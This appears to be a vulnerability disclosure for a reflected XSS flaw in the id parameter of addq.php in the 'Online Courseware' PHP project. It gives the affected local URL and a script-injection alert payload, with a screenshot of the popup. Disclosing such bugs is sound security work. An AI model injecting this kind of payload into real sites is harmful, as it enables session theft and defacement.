#### BUG_AUTHOR:LIU WEIYU
## Online Courseware – reflected XSS on (addq.php?id=Grammar) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
addq.php?id=Grammar 

On this page,id parameter is vulnerable to reflected XSS Attack 
### Proof of vulnerability:
#### Visit this page:
http://localhost/onlinecourseware/pcci/teacher/addq.php?id=Grammar
### Payload：
"><script>alert(1)</script>
### Trigger popup：
<img width="416" alt="image" src="https://github.com/thisissuperann/Vul/assets/148440408/afa9409e-7c54-4d42-8f8b-56f484349695">
